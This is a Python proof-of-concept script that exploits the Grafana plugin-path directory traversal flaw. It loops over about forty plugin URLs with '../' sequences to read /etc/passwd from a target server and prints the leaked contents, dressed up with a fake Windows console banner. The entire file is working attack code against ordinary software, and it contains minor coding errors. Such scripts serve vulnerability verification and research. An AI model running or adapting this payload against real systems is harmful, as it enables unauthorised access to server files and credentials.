#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#author: myh0st@xazlsec


import requests
import urllib3
import urllib
import sys
import json
import re

urllib3.disable_warnings()

def verify(target):
    plugin_list = [
        '/public/plugins/alertlist/../../../../../../../../etc/passwd',
        '/public/plugins/annolist/../../../../../../../../etc/passwd',
        '/public/plugins/barchart/../../../../../../../../etc/passwd',
        '/public/plugins/cloudwatch/../../../../../../../../etc/passwd',
        '/public/plugins/dashlist/../../../../../../../../etc/passwd',
        '/public/plugins/elasticsearch/../../../../../../../../etc/passwd',
        '/public/plugins/graph/../../../../../../../../etc/passwd',
        '/public/plugins/graphite/../../../../../../../../etc/passwd',
        '/public/plugins/heatmap/../../../../../../../../etc/passwd',
        '/public/plugins/influxdb/../../../../../../../../etc/passwd',
        '/public/plugins/mysql/../../../../../../../../etc/passwd',
        '/public/plugins/opentsdb/../../../../../../../../etc/passwd',
        '/public/plugins/pluginlist/../../../../../../../../etc/passwd',
        '/public/plugins/postgres/../../../../../../../../etc/passwd',
        '/public/plugins/prometheus/../../../../../../../../etc/passwd',
        '/public/plugins/stackdriver/../../../../../../../../etc/passwd',
        '/public/plugins/table/../../../../../../../../etc/passwd',
        '/public/plugins/text/../../../../../../../../etc/passwd',
        '/public/plugins/grafana-azure-monitor-datasource/../../../../../../../../etc/passwd',
        '/public/plugins/bargauge/../../../../../../../../etc/passwd',
        '/public/plugins/gauge/../../../../../../../../etc/passwd',
        '/public/plugins/geomap/../../../../../../../../etc/passwd',
        '/public/plugins/gettingstarted/../../../../../../../../etc/passwd',
        '/public/plugins/histogram/../../../../../../../../etc/passwd',
        '/public/plugins/jaeger/../../../../../../../../etc/passwd',
        '/public/plugins/logs/../../../../../../../../etc/passwd',
        '/public/plugins/loki/../../../../../../../../etc/passwd',
        '/public/plugins/mssql/../../../../../../../../etc/passwd',
        '/public/plugins/news/../../../../../../../../etc/passwd',
        '/public/plugins/nodeGraph/../../../../../../../../etc/passwd',
        '/public/plugins/piechart/../../../../../../../../etc/passwd',
        '/public/plugins/stat/../../../../../../../../etc/passwd',
        '/public/plugins/state-timeline/../../../../../../../../etc/passwd',
        '/public/plugins/status-history/../../../../../../../../etc/passwd',
        '/public/plugins/table-old/../../../../../../../../etc/passwd',
        '/public/plugins/tempo/../../../../../../../../etc/passwd',
        '/public/plugins/testdata/../../../../../../../../etc/passwd',
        '/public/plugins/timeseries/../../../../../../../../etc/passwd',
        '/public/plugins/welcome/../../../../../../../../etc/passwd',
        '/public/plugins/zipkin/../../../../../../../../etc/passwd',
    ]
    headers = {"User-Agent": "Mozilla/5.0 (X11; Gentoo; rv:82.1) Gecko/20100101 Firefox/82.1"}
    site = "/".join(target.split("/")[:3])
    for plugin_path in plugin_list:
        paylaod = site + plugin_path
        try:
            re = urllib.request.Request(url=paylaod, headers=headers)
            res = urllib.request.urlopen(re, timeout=3)
            code = res.getcode()
            context = res.read()
            # print("payload：" + paylaod)
            if "root:x" in context.decode('utf-8') and code == 200:
                print("发现漏洞可以利用：")
                print("payload：" + paylaod)
                return  context.decode('utf-8')[:1000]
        except:
            return False
    return False


if __name__=="__main__":
    target = sys.argv[1]
    print("Microsoft Windows [版本 10.0.19044.3086]\n(c) Microsoft Corporation。保留所有权利。\n\nD:\VulnSubmit\script>python3 grafana-file-read.py ",target)
    info = verify(target)
    if info:
        print("[+]漏洞存在，读取 passwd 的结果为：", info)
    else:
        print("[-]漏洞不存在")
